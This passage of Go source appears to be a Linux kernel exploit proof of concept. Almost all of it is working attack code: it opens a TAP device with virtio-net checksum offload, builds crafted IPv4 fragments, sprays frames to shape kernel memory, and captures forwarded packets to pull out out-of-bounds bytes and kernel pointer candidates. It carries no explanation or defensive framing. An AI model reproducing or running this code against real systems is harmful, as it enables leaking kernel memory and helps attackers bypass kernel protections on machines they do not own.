		return fmt.Errorf("verify: wanted word 0x%04x at IP offset %d, got 0x%04x", c.csumWord, c.csumOffset, written)
	}
	if preserve != 0xffff {
		fmt.Printf("verify: fragment construction rewrites mask 0x%04x after checksum completion; preserved mask 0x%04x matched\n", ^preserve, preserve)
	}
	return nil
}

func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
	payload := make([]byte, c.head+c.rest)
	for i := range payload {
		payload[i] = 0x11
	}
	proto := byte(ipProtoRaw)
	switch c.transport {
	case "udp":
		proto = ipProtoUDP
		egressUDPHeaders(payload, uint16(c.udpSrcPort), uint16(c.udpPort))
	case "tcp":
		proto = ipProtoTCP
		egressTCPHeaders(payload, uint16(c.tcpSrcPort), uint16(c.tcpPort))
	default:
		for i := 0; i < c.head; i++ {
			payload[i] = marker
		}
	}
	src := net.ParseIP("10.0.0.2").To4()
	dst := net.ParseIP("10.99.0.2").To4()
	if !egressSolveAt(payload, ipID, src, dst, proto, c.csumOffset, uint16(c.csumWord), egressAdjustmentIPOffset(c.transport)) {
		return nil, fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
	}
	if verbose {
		printHead(c)
	}
	second := frameWithVLAN(egressFragment(c.head, false, payload[c.head:], ipID, src, dst, proto), c.vlanTags)
	if err := writeTap(tap, second, true, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
		return nil, err
	}
	tebar := egressSprayFrame(
		net.HardwareAddr{0x02, 0x00, 0x00, 0x00, 0x00, 0x02},
		net.HardwareAddr{0x02, 0x00, 0x00, 0x00, 0x00, 0x01},
		c.tebarFill,
	)
	for i := 0; i < c.tebar; i++ {
		if err := writeTap(tap, tebar, false, 0, 0); err != nil {
			return nil, err
		}
	}
	if c.tebar > 0 && c.sprayDelay > 0 {
		time.Sleep(c.sprayDelay)
	}
	first := frameWithVLAN(egressFragment(0, true, payload[:c.head], ipID, src, dst, proto), c.vlanTags)
	if err := writeTap(tap, first, true, uint16(l2LenForTags(c.vlanTags)), uint16(c.csumOffset)); err != nil {
		return nil, err
	}
	pkts := cap.collect(c.capture, observedID(c, ipID))
	if len(pkts) == 0 {
		return nil, errors.New("no fragment captured")
	}
	var leaks [][]byte
	var balied, mutated bool
	for i, ip := range pkts {
		ihl := int(ip[0]&0x0f) * 4
		if verbose {
			fmt.Printf("frag %d first=0x%02x ihl_bytes=%d tot=%d\n",
				i, ip[0], ihl, binary.BigEndian.Uint16(ip[2:]))
		}
		if len(ip) < c.csumOffset+2 {
			continue
		}
		written := binary.LittleEndian.Uint16(ip[c.csumOffset : c.csumOffset+2])
		preserve := fragmentPreserveMask(c.csumOffset)
		if (written & preserve) != (uint16(c.csumWord) & preserve) {
			continue
		}
		mutated = true
		if c.csumOffset != 0 || c.csumWord != 0x004f {
			if verbose {
				fmt.Printf("  deferred-word offset=%d wanted=0x%04x observed=0x%04x\n", c.csumOffset, c.csumWord, written)
			}
			continue
		}
		extra := ip[ipLen:ihl]
		if verbose {
			fmt.Printf("  options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
			if ip[9] == ipProtoUDP && binary.BigEndian.Uint16(ip[6:])&0x1fff == 0 && len(ip) >= ihl+8 {
				udp := ip[ihl : ihl+8]
				fmt.Printf("  post-mutation udp src=%d dst=%d len=%d checksum=0x%04x\n",
					binary.BigEndian.Uint16(udp[0:2]), binary.BigEndian.Uint16(udp[2:4]),
					binary.BigEndian.Uint16(udp[4:6]), binary.BigEndian.Uint16(udp[6:8]))
			} else if ip[9] == ipProtoTCP && binary.BigEndian.Uint16(ip[6:])&0x1fff == 0 && len(ip) >= ihl+20 {
				tcp := ip[ihl : ihl+20]
				fmt.Printf("  post-mutation tcp src=%d dst=%d data_offset=%d flags=0x%02x checksum=0x%04x\n",
					binary.BigEndian.Uint16(tcp[0:2]), binary.BigEndian.Uint16(tcp[2:4]),
					tcp[12]>>4, tcp[13], binary.BigEndian.Uint16(tcp[16:18]))
			}
		}
		host := extra[c.head:]
		leaks = append(leaks, append([]byte(nil), host...))
		nonzero := 0
		for _, b := range host {
			if b != 0 {
				nonzero++
			}
		}
		if len(host) > 0 {
			balied = true
		}
		if verbose {
			fmt.Printf("  past-linear hex=%s ascii=%q nonzero=%d/%d\n",
				hex.EncodeToString(host), string(host), nonzero, len(host))
			printKernelPointerCandidates("  ", host)
		}
	}
	if verbose {
		switch {
		case balied:
			fmt.Println("123")
		case mutated:
			fmt.Println("456")
		default:
			fmt.Println("678")
		}
	}
	return leaks, nil
}

func testo(payload []byte, id uint16, csumOffset int, desired uint16) bool {
	const adj = 32
	if adj+1 >= ipLen+len(payload) {
		return false
	}
	off := adj - ipLen
	for w := 0; w < 65536; w++ {
		payload[off] = byte(w)
		payload[off+1] = byte(w >> 8)
		pkt := datagram(id, payload)
		forwardTTL(pkt)
		if csumFold(csumPartial(pkt)) == desired {
			return true
		}
	}
	return false
}

func fragmentPreserveMask(offset int) uint16 {
	mask := uint16(0xffff)
	for byteIndex := 0; byteIndex < 2; byteIndex++ {
		absolute := offset + byteIndex
		if (absolute >= 2 && absolute < 4) ||
			(absolute >= 6 && absolute < 8) ||
			(absolute >= 10 && absolute < 12) {
			mask &^= 0xff << (8 * byteIndex)
		}
	}
	return mask
}

func observedID(c cfg, original uint16) uint16 {
	var id [2]byte
	binary.BigEndian.PutUint16(id[:], original)
	var written [2]byte
	binary.LittleEndian.PutUint16(written[:], uint16(c.csumWord))
	for i := 0; i < 2; i++ {
		absolute := c.csumOffset + i
		if absolute >= 4 && absolute < 6 {
			id[absolute-4] = written[i]
		}
	}
	return binary.BigEndian.Uint16(id[:])
}

func datagram(id uint16, payload []byte) []byte {
	return fragment(0, false, payload, id)
}

func fragment(offset int, more bool, payload []byte, idOpt ...uint16) []byte {
	id := uint16(ipID)
	if len(idOpt) > 0 {
		id = idOpt[0]
	}
	pkt := make([]byte, ipLen+len(payload))
	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	off := uint16(offset / 8)
	if more {
		off |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], off)
	pkt[8] = 64
	pkt[9] = 253
	copy(pkt[12:16], net.ParseIP("10.0.0.2").To4())
	copy(pkt[16:20], net.ParseIP("10.99.0.2").To4())
	copy(pkt[ipLen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:ipLen]))
	return pkt
}

func forwardTTL(pkt []byte) {
	raw := uint32(pkt[10]) | uint32(pkt[11])<<8
	raw += 0x0001
	if raw >= 0xFFFF {
		raw++
	}
	pkt[8]--
	pkt[10] = byte(raw)
	pkt[11] = byte(raw >> 8)
}
func frame(ip []byte) []byte {
	return frameWithVLAN(ip, 2)
}

func frameWithVLAN(ip []byte, tags int) []byte {
	l2 := l2LenForTags(tags)
	f := make([]byte, l2+len(ip))
	copy(f[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
	copy(f[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
	binary.BigEndian.PutUint16(f[12:], vlanProto)
	off := ethLen
	for i := 0; i < tags; i++ {
		binary.BigEndian.PutUint16(f[off:], 0)
		proto := uint16(vlanProto)
		if i == tags-1 {
			proto = ipProtoEth
		}
		binary.BigEndian.PutUint16(f[off+2:], proto)
		off += vlanLen
	}
	copy(f[l2:], ip)
	return f
}

func l2LenForTags(tags int) int { return ethLen + tags*vlanLen }

func writeTap(tap *os.File, frame []byte, csum bool, start, offset uint16) error {
	buf := make([]byte, 10+len(frame))
	if csum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], start)
		binary.LittleEndian.PutUint16(buf[8:], offset)
	}
	copy(buf[10:], frame)
	for {
		_, err := tap.Write(buf)
		if err == nil || !errors.Is(err, syscall.EAGAIN) {
			return err
		}
		time.Sleep(time.Millisecond)
	}
}

type capture struct{ fd int }

func (c *capture) drainCount(count int, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 65536)
	for received := 0; received < count; {
		if time.Now().After(deadline) {
			return fmt.Errorf("received %d/%d frames before timeout", received, count)
		}
		_, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) || errors.Is(err, syscall.EINTR) {
				continue
			}
			return err
		}
		received++
	}
	return nil
}

func listen(ifname string) (*capture, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return nil, err
	}
	ifi, err := net.InterfaceByName(ifname)
	if err != nil {
		syscall.Close(fd)
		return nil, err
	}
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(syscall.ETH_P_ALL), Ifindex: ifi.Index}); err != nil {
		syscall.Close(fd)
		return nil, err
	}
	syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 5000})
	return &capture{fd: fd}, nil
}

func (c *capture) Close() { syscall.Close(c.fd) }

func (c *capture) drain(d time.Duration) {
	deadline := time.Now().Add(d)
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		_, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil && !errors.Is(err, syscall.EAGAIN) && !errors.Is(err, syscall.EWOULDBLOCK) {
			return
		}
	}
}

func (c *capture) collect(d time.Duration, id uint16) [][]byte {
	deadline := time.Now().Add(d)
	var out [][]byte
	buf := make([]byte, 65536)
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(c.fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) {
				continue
			}
			break
		}
		ip := ipv4Of(buf[:n])
		if ip == nil || binary.BigEndian.Uint16(ip[4:]) != id {
			continue
		}
		out = append(out, append([]byte(nil), ip...))
	}
	return out
}

func ipv4Of(frame []byte) []byte {
	proto, payload := ethernetPayload(frame)
	if proto != ipProtoEth || len(payload) < ipLen {
		return nil
	}
	return payload
}

func ethernetPayload(frame []byte) (uint16, []byte) {
	if len(frame) < ethLen {
		return 0, nil
	}
	off := ethLen
	proto := binary.BigEndian.Uint16(frame[12:14])
	for proto == vlanProto {
		if len(frame) < off+vlanLen {
			return 0, nil
		}
		proto = binary.BigEndian.Uint16(frame[off+2 : off+4])
		off += vlanLen
	}
	return proto, frame[off:]
}

func openTap(name string, page bool) (*os.File, error) {
	flags := os.O_RDWR
	if page {
		flags |= syscall.O_NONBLOCK
	}
	f, err := os.OpenFile("/dev/net/tun", flags, 0)
	if err != nil {
		return nil, err
	}
	var req [64]byte
	copy(req[:], name)
	*(*uint16)(unsafe.Pointer(&req[16])) = iffTap | iffNoPI | iffVnetHdr
	if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetIFF, uintptr(unsafe.Pointer(&req[0]))); errno != 0 {
		f.Close()
		return nil, fmt.Errorf("TUNSETIFF: %w", errno)
	}
	if page {
		snd := int32(0x7fffffff)
		if _, _, errno := syscall.Syscall(syscall.SYS_IOCTL, f.Fd(), tunSetSndBuf, uintptr(unsafe.Pointer(&snd))); errno != 0 {
			f.Close()
			return nil, fmt.Errorf("TUNSETSNDBUF: %w", errno)
		}
	}
	return f, nil
}

func printHead(c cfg) {
	frameLen := l2LenForTags(c.vlanTags) + ipLen + c.head
	past := 60 - (ipLen + c.head)
	via := "slab skb (tun_alloc_skb)"
	if c.page {
		via = "page_frag skb (tun_build_skb)"
	}
	fmt.Printf("head: payload=%d frame=%d vlan_tags=%d linear_after_strip=%d copy=60 past_headlen=%d via=%s tebar=%d fill=0x%02x\n",
		c.head, frameLen, c.vlanTags, ipLen+c.head, past, via, c.tebar, c.tebarFill)
}

func ipChecksum(h []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(h); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(h[i:]))
	}
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func csumPartial(b []byte) uint32 {
	var sum uint32
	i := 0
	for ; i+1 < len(b); i += 2 {
		sum += uint32(b[i]) | uint32(b[i+1])<<8
	}
	if i < len(b) {
		sum += uint32(b[i])
	}
	return sum
}

func csumFold(sum uint32) uint16 {
	sum = (sum & 0xffff) + (sum >> 16)
	sum = (sum & 0xffff) + (sum >> 16)
	return ^uint16(sum)
}

func bytesRepeat(n int, b byte) []byte {
	p := make([]byte, n)
	for i := range p {
		p[i] = b
	}
	return p
}

func getenv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func htons(v uint16) uint16 { return v<<8 | v>>8 }
